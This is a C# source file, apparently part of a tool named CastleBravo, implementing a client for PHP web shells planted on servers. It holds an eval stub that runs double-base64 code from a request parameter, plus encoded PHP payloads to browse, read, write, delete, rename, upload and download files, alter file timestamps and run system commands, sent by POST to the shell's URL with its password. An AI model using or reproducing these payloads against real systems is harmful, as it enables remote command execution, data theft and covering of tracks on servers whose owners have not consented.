using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Web;
using System.Windows.Forms;

namespace C2.Business.CastleBravo.WebShellTool
{
    public class WebShell
    {
        private string url;
        private string pwd;
        public List<string> PayloadLog;
        //private string directorySeparator = "/";

        [NonSerialized]
        private WebClient client;

        private const string SPL = "->|";
        private const string SPR = "|<-";
        private const string CODE = "code";
        private const string ACTION = "action";
        private const string PARAM1 = "z1";
        private const string PARAM2 = "z2";
        private const string PARAM3 = "z3";
        private const string PHP_BASE64 = "1";
        private const string PHP_MAKE = "@eval/*ABC*/(base64_decode(base64_decode($_REQUEST[action])));";
        private const string PHP_INDEX = "UUdsdWFWOXpaWFFvSW1ScGMzQnNZWGxmWlhKeWIzSnpJaXdpTUNJcE8wQnpaWFJmZEdsdFpWOXNhVzFwZENnd0tUdEFjMlYwWDIxaFoybGpYM0YxYjNSbGMxOXlkVzUwYVcxbEtEQXBPMlZqYUc4b0lpMCtmQ0lwT3pza1JEMWthWEp1WVcxbEtDUmZVMFZTVmtWU1d5SlRRMUpKVUZSZlJrbE1SVTVCVFVVaVhTazdhV1lvSkVROVBTSWlLU1JFUFdScGNtNWhiV1VvSkY5VFJWSldSVkpiSWxCQlZFaGZWRkpCVGxOTVFWUkZSQ0pkS1Rza1VqMGlleVJFZlZ4MElqdHBaaWh6ZFdKemRISW9KRVFzTUN3eEtTRTlJaThpS1h0bWIzSmxZV05vS0hKaGJtZGxLQ0pCSWl3aVdpSXBJR0Z6SUNSTUtXbG1LR2x6WDJScGNpZ2lleVJNZlRvaUtTa2tVaTQ5SW5za1RIMDZJanQ5SkZJdVBTSmNkQ0k3SkhVOUtHWjFibU4wYVc5dVgyVjRhWE4wY3lnbmNHOXphWGhmWjJWMFpXZHBaQ2NwS1Q5QWNHOXphWGhmWjJWMGNIZDFhV1FvUUhCdmMybDRYMmRsZEdWMWFXUW9LU2s2SnljN0pIVnpjajBvSkhVcFB5UjFXeWR1WVcxbEoxMDZRR2RsZEY5amRYSnlaVzUwWDNWelpYSW9LVHNrVWk0OWNHaHdYM1Z1WVcxbEtDazdKRkl1UFNJb2V5UjFjM0o5S1NJN2NISnBiblFnSkZJN08yVmphRzhvSW53OExTSXBPMlJwWlNncE93PT0%3d";
        private const string PHP_READDICT = "UUdsdWFWOXpaWFFvSW1ScGMzQnNZWGxmWlhKeWIzSnpJaXdpTUNJcE8wQnpaWFJmZEdsdFpWOXNhVzFwZENnd0tUdEFjMlYwWDIxaFoybGpYM0YxYjNSbGMxOXlkVzUwYVcxbEtEQXBPMlZqYUc4b0lpMCtmQ0lwT3pza1JEMWlZWE5sTmpSZlpHVmpiMlJsS0NSZlVFOVRWRnNpZWpFaVhTazdKRVk5UUc5d1pXNWthWElvSkVRcE8ybG1LQ1JHUFQxT1ZVeE1LWHRsWTJodktDSkZVbEpQVWpvdkx5QlFZWFJvSUU1dmRDQkdiM1Z1WkNCUGNpQk9ieUJRWlhKdGFYTnphVzl1SVNJcE8zMWxiSE5sZXlSTlBVNVZURXc3SkV3OVRsVk1URHQzYUdsc1pTZ2tUajFBY21WaFpHUnBjaWdrUmlrcGV5UlFQU1JFTGlJdklpNGtUanNrVkQxQVpHRjBaU2dpV1MxdExXUWdTRHBwT25NaUxFQm1hV3hsYlhScGJXVW9KRkFwS1R0QUpFVTljM1ZpYzNSeUtHSmhjMlZmWTI5dWRtVnlkQ2hBWm1sc1pYQmxjbTF6S0NSUUtTd3hNQ3c0S1N3dE5DazdKRkk5SWx4MElpNGtWQzRpWEhRaUxrQm1hV3hsYzJsNlpTZ2tVQ2t1SWx4MElpNGtSUzRpQ2lJN2FXWW9RR2x6WDJScGNpZ2tVQ2twSkUwdVBTUk9MaUl2SWk0a1VqdGxiSE5sSUNSTUxqMGtUaTRrVWp0OVpXTm9ieUFrVFM0a1REdEFZMnh2YzJWa2FYSW9KRVlwTzMwN1pXTm9ieWdpZkR3dElpazdaR2xsS0NrNw%3d%3d";
        private const string PHP_READFILE = "UUdsdWFWOXpaWFFvSW1ScGMzQnNZWGxmWlhKeWIzSnpJaXdpTUNJcE8wQnpaWFJmZEdsdFpWOXNhVzFwZENnd0tUdEFjMlYwWDIxaFoybGpYM0YxYjNSbGMxOXlkVzUwYVcxbEtEQXBPMlZqYUc4b0lpMCtmQ0lwT3pza1JqMWlZWE5sTmpSZlpHVmpiMlJsS0NSZlVFOVRWRnNpZWpFaVhTazdKRkE5UUdadmNHVnVLQ1JHTENKeUlpazdaV05vYnloQVpuSmxZV1FvSkZBc1ptbHNaWE5wZW1Vb0pFWXBLU2s3UUdaamJHOXpaU2drVUNrN08yVmphRzhvSW53OExTSXBPMlJwWlNncE93PT0%3d";
        private const string PHP_SAVEFILE = "UUdsdWFWOXpaWFFvSW1ScGMzQnNZWGxmWlhKeWIzSnpJaXdpTUNJcE8wQnpaWFJmZEdsdFpWOXNhVzFwZENnd0tUdEFjMlYwWDIxaFoybGpYM0YxYjNSbGMxOXlkVzUwYVcxbEtEQXBPMlZqYUc4b0lpMCtmQ0lwT3p0bFkyaHZJRUJtZDNKcGRHVW9abTl3Wlc0b1ltRnpaVFkwWDJSbFkyOWtaU2drWDFCUFUxUmJJbm94SWwwcExDSjNJaWtzWW1GelpUWTBYMlJsWTI5a1pTZ2tYMUJQVTFSYklub3lJbDBwS1Q4aU1TSTZJakFpT3p0bFkyaHZLQ0o4UEMwaUtUdGthV1VvS1RzPQ%3d%3d";
        private const string PHP_DELETE = "UUdsdWFWOXpaWFFvSW1ScGMzQnNZWGxmWlhKeWIzSnpJaXdpTUNJcE8wQnpaWFJmZEdsdFpWOXNhVzFwZENnd0tUdEFjMlYwWDIxaFoybGpYM0YxYjNSbGMxOXlkVzUwYVcxbEtEQXBPMlZqYUc4b0lpMCtmQ0lwT3p0bWRXNWpkR2x2YmlCa1ppZ2tjQ2w3SkcwOVFHUnBjaWdrY0NrN2QyaHBiR1VvUUNSbVBTUnRMVDV5WldGa0tDa3BleVJ3Wmowa2NDNGlMeUl1SkdZN2FXWW9LR2x6WDJScGNpZ2tjR1lwS1NZbUtDUm1JVDBpTGlJcEppWW9KR1loUFNJdUxpSXBLWHRBWTJodGIyUW9KSEJtTERBM056Y3BPMlJtS0NSd1ppazdmV2xtS0dselgyWnBiR1VvSkhCbUtTbDdRR05vYlc5a0tDUndaaXd3TnpjM0tUdEFkVzVzYVc1cktDUndaaWs3Zlgwa2JTMCtZMnh2YzJVb0tUdEFZMmh0YjJRb0pIQXNNRGMzTnlrN2NtVjBkWEp1SUVCeWJXUnBjaWdrY0NrN2ZTUkdQV2RsZEY5dFlXZHBZMTl4ZFc5MFpYTmZaM0JqS0NrL1ltRnpaVFkwWDJSbFkyOWtaU2h6ZEhKcGNITnNZWE5vWlhNb0pGOVFUMU5VV3lKNk1TSmRLU2s2WW1GelpUWTBYMlJsWTI5a1pTZ2tYMUJQVTFSYklub3hJbDBwTzJsbUtHbHpYMlJwY2lna1Jpa3BaV05vYnloa1ppZ2tSaWtwTzJWc2MyVjdaV05vYnlobWFXeGxYMlY0YVhOMGN5Z2tSaWsvUUhWdWJHbHVheWdrUmlrL0lqRWlPaUl3SWpvaU1DSXBPMzA3WldOb2J5Z2lmRHd0SWlrN1pHbGxLQ2s3";
        private const string PHP_RENAME = "UUdsdWFWOXpaWFFvSW1ScGMzQnNZWGxmWlhKeWIzSnpJaXdpTUNJcE8wQnpaWFJmZEdsdFpWOXNhVzFwZENnd0tUdEFjMlYwWDIxaFoybGpYM0YxYjNSbGMxOXlkVzUwYVcxbEtEQXBPMlZqYUc4b0lpMCtmQ0lwT3pza2JUMW5aWFJmYldGbmFXTmZjWFZ2ZEdWelgyZHdZeWdwT3lSemNtTTliVDlpWVhObE5qUmZaR1ZqYjJSbEtITjBjbWx3YzJ4aGMyaGxjeWdrWDFCUFUxUmJJbm94SWwwcEtUcGlZWE5sTmpSZlpHVmpiMlJsS0NSZlVFOVRWRnNpZWpFaVhTazdKR1J6ZEQxdFAySmhjMlUyTkY5a1pXTnZaR1VvYzNSeWFYQnpiR0Z6YUdWektDUmZVRTlUVkZzaWVqSWlYU2twT21KaGMyVTJORjlrWldOdlpHVW9KRjlRVDFOVVd5SjZNaUpkS1R0bFkyaHZLSEpsYm1GdFpTZ2tjM0pqTENSa2MzUXBQeUl4SWpvaU1DSXBPenRsWTJodktDSjhQQzBpS1R0a2FXVW9LVHM9";
        private const string PHP_RETIME = "UUdsdWFWOXpaWFFvSW1ScGMzQnNZWGxmWlhKeWIzSnpJaXdpTUNJcE8wQnpaWFJmZEdsdFpWOXNhVzFwZENnd0tUdEFjMlYwWDIxaFoybGpYM0YxYjNSbGMxOXlkVzUwYVcxbEtEQXBPMlZqYUc4b0lpMCtmQ0lwT3pza2JUMW5aWFJmYldGbmFXTmZjWFZ2ZEdWelgyZHdZeWdwT3lSR1RqMXRQMkpoYzJVMk5GOWtaV052WkdVb2MzUnlhWEJ6YkdGemFHVnpLQ1JmVUU5VFZGc2llakVpWFNrcE9tSmhjMlUyTkY5a1pXTnZaR1VvSkY5UVQxTlVXeUo2TVNKZEtUc2tWRTA5YzNSeWRHOTBhVzFsS0cwL1ltRnpaVFkwWDJSbFkyOWtaU2h6ZEhKcGNITnNZWE5vWlhNb0pGOVFUMU5VV3lKNk1pSmRLU2s2WW1GelpUWTBYMlJsWTI5a1pTZ2tYMUJQVTFSYklub3lJbDBwS1R0cFppaG1hV3hsWDJWNGFYTjBjeWdrUms0cEtYdGxZMmh2S0VCMGIzVmphQ2drUms0c0pGUk5MQ1JVVFNrL0lqRWlPaUl3SWlrN2ZXVnNjMlY3WldOb2J5Z2lNQ0lwTzMwN08yVmphRzhvSW53OExTSXBPMlJwWlNncE93PT0%3d";
        private const string PHP_NEWDICT = "UUdsdWFWOXpaWFFvSW1ScGMzQnNZWGxmWlhKeWIzSnpJaXdpTUNJcE8wQnpaWFJmZEdsdFpWOXNhVzFwZENnd0tUdEFjMlYwWDIxaFoybGpYM0YxYjNSbGMxOXlkVzUwYVcxbEtEQXBPMlZqYUc4b0lpMCtmQ0lwT3pza2JUMW5aWFJmYldGbmFXTmZjWFZ2ZEdWelgyZHdZeWdwT3lSbVBTUnRQMkpoYzJVMk5GOWtaV052WkdVb2MzUnlhWEJ6YkdGemFHVnpLQ1JmVUU5VFZGc2llakVpWFNrcE9tSmhjMlUyTkY5a1pXTnZaR1VvSkY5UVQxTlVXeUo2TVNKZEtUdGxZMmh2S0cxclpHbHlLQ1JtS1Q4aU1TSTZJakFpS1RzN1pXTm9ieWdpZkR3dElpazdaR2xsS0NrNw%3d%3d";
        private const string PHP_UPLOAD = "UUdsdWFWOXpaWFFvSW1ScGMzQnNZWGxmWlhKeWIzSnpJaXdpTUNJcE8wQnpaWFJmZEdsdFpWOXNhVzFwZENnd0tUdEFjMlYwWDIxaFoybGpYM0YxYjNSbGMxOXlkVzUwYVcxbEtEQXBPMlZqYUc4b0lpMCtmQ0lwT3pza1pqMWlZWE5sTmpSZlpHVmpiMlJsS0NSZlVFOVRWRnNpZWpFaVhTazdKR005SkY5UVQxTlVXeUo2TWlKZE95UmpQWE4wY2w5eVpYQnNZV05sS0NKY2NpSXNJaUlzSkdNcE95UmpQWE4wY2w5eVpYQnNZV05sS0NKY2JpSXNJaUlzSkdNcE95UmlkV1k5SWlJN1ptOXlLQ1JwUFRBN0pHazhjM1J5YkdWdUtDUmpLVHNrYVNzOU1pa2tZblZtTGoxMWNteGtaV052WkdVb0lpVWlMbk4xWW5OMGNpZ2tZeXdrYVN3eUtTazdaV05vYnloQVpuZHlhWFJsS0dadmNHVnVLQ1JtTENKM0lpa3NKR0oxWmlrL0lqRWlPaUl3SWlrN08yVmphRzhvSW53OExTSXBPMlJwWlNncE93PT0%3d";
        private const string PHP_DOWNLOAD = "UUdsdWFWOXpaWFFvSW1ScGMzQnNZWGxmWlhKeWIzSnpJaXdpTUNJcE8wQnpaWFJmZEdsdFpWOXNhVzFwZENnd0tUdEFjMlYwWDIxaFoybGpYM0YxYjNSbGMxOXlkVzUwYVcxbEtEQXBPMlZqYUc4b0lpMCtmQ0lwT3pza1JqMW5aWFJmYldGbmFXTmZjWFZ2ZEdWelgyZHdZeWdwUDJKaGMyVTJORjlrWldOdlpHVW9jM1J5YVhCemJHRnphR1Z6S0NSZlVFOVRWRnNpZWpFaVhTa3BPbUpoYzJVMk5GOWtaV052WkdVb0pGOVFUMU5VV3lKNk1TSmRLVHNrWm5BOVFHWnZjR1Z1S0NSR0xDSnlJaWs3YVdZb1FHWm5aWFJqS0NSbWNDa3BlMEJtWTJ4dmMyVW9KR1p3S1R0QWNtVmhaR1pwYkdVb0pFWXBPMzFsYkhObGUyVmphRzhvSWtWU1VrOVNPaTh2SUVOaGJpQk9iM1FnVW1WaFpDSXBPMzA3WldOb2J5Z2lmRHd0SWlrN1pHbGxLQ2s3";
        private const string PHP_SHELL = "UUdsdWFWOXpaWFFvSW1ScGMzQnNZWGxmWlhKeWIzSnpJaXdpTUNJcE8wQnpaWFJmZEdsdFpWOXNhVzFwZENnd0tUdEFjMlYwWDIxaFoybGpYM0YxYjNSbGMxOXlkVzUwYVcxbEtEQXBPMlZqYUc4b0lpMCtmQ0lwT3pza2NEMWlZWE5sTmpSZlpHVmpiMlJsS0NSZlVFOVRWRnNpZWpFaVhTazdKSE05WW1GelpUWTBYMlJsWTI5a1pTZ2tYMUJQVTFSYklub3lJbDBwT3lSa1BXUnBjbTVoYldVb0pGOVRSVkpXUlZKYklsTkRVa2xRVkY5R1NVeEZUa0ZOUlNKZEtUc2tZejF6ZFdKemRISW9KR1FzTUN3eEtUMDlJaThpUHlJdFl5QmNJbnNrYzMxY0lpSTZJaTlqSUZ3aWV5UnpmVndpSWpza2NqMGlleVJ3ZlNCN0pHTjlJanRBYzNsemRHVnRLQ1J5TGlJZ01qNG1NU0lzSkhKbGRDazdjSEpwYm5RZ0tDUnlaWFFoUFRBcFB5SUtjbVYwUFhza2NtVjBmUW9pT2lJaU96dGxZMmh2S0NKOFBDMGlLVHRrYVdVb0tUcz0%3d";

        public WebShell(string address, string pVariable)
        {
            this.url = address;
            this.pwd = pVariable;
            this.client = new WebClient();
            PayloadLog = new List<string>();
            client.Encoding = Encoding.UTF8;
        }

        public Tuple<string, List<WSFile>> CurrentPathBrowse()
        {
            return PathBrowse(PHPIndex());
        }

        public Tuple<string, List<WSFile>> PathBrowse(string path)
        {
            List<WSFile> pathFiles = new List<WSFile>();

            if (string.IsNullOrEmpty(path))
                return Tuple.Create(path, pathFiles);


            string readDict = PHPReadDict(path);
            foreach (string item in readDict.Split('\n'))
            {
                string[] itemInfo = item.Split('\t');
                if (itemInfo.Length != 4 || itemInfo[0] == "./" || itemInfo[0] == "../" || string.IsNullOrEmpty(itemInfo[0]))
                    continue;

                pathFiles.Add(new WSFile(itemInfo[0].EndsWith("/") ? WebShellFileType.Directory : WebShellFileType.File,
                                         itemInfo[0].EndsWith("/") ? itemInfo[0].Substring(0, itemInfo[0].Length - 1) : itemInfo[0],
                                         itemInfo[1],
                                         itemInfo[2],
                                         itemInfo[3]));
            }
            return Tuple.Create(path, pathFiles);
        }

        private string PHPIndex()
        {
            PayloadLog.Add("========获取当前路径========");
            return PHPPost(pwd + "=" + PHP_MAKE + "&" + ACTION + "=" + PHP_INDEX).Split('\t')[0];
        }

        private string PHPReadDict(string path)
        {
            PayloadLog.Add("========获取" + path + "文件========");
            return PHPPost(pwd + "=" + PHP_MAKE + "&" + ACTION + "=" + PHP_READDICT + "&" + PARAM1 + "=" + HttpUtility.UrlEncode(Convert.ToBase64String(Encoding.UTF8.GetBytes(path))));
        }

        private string PHPPost(string payload)
        {
            client.Headers.Add("Content-Type", "application/x-www-form-urlencoded");

            byte[] postData = Encoding.UTF8.GetBytes(payload);
            byte[] responseData = client.UploadData(url, "POST", postData);//得到返回字符流  
            string result = Encoding.UTF8.GetString(responseData);//解码 

            foreach(string kv in payload.Split('&'))
            {
                PayloadLog.Add(kv);
            }

            return MidStrEx(result, SPL, SPR);
        }

        private string MidStrEx(string sourse, string startstr, string endstr)
        {
            string result = string.Empty;
            int startindex, endindex;
            try
            {
                startindex = sourse.IndexOf(startstr);
                if (startindex == -1)
                    return result;
                string tmpstr = sourse.Substring(startindex + startstr.Length);
                endindex = tmpstr.IndexOf(endstr);
                if (endindex == -1)
                    return result;
                result = tmpstr.Remove(endindex);
            }
            catch { }
            return result;
        }
    }

    public enum WebShellFileType
    {
        Null,
        Directory,
        File
    }

    public class WSFile
    {
        public WebShellFileType Type { get; set; }
        public string FileName { get; set; }
        public string CreateTime { get; set; }
        public string FileSize { get; set; }
        public string LastMod { get; set; }

        public WSFile(WebShellFileType type, string fileName, string createTime, string fileSize, string lastMod)
        {
            Type = type;
            FileName = fileName;
            CreateTime = createTime;
            FileSize = fileSize;
            LastMod = lastMod;
        }
    }
}

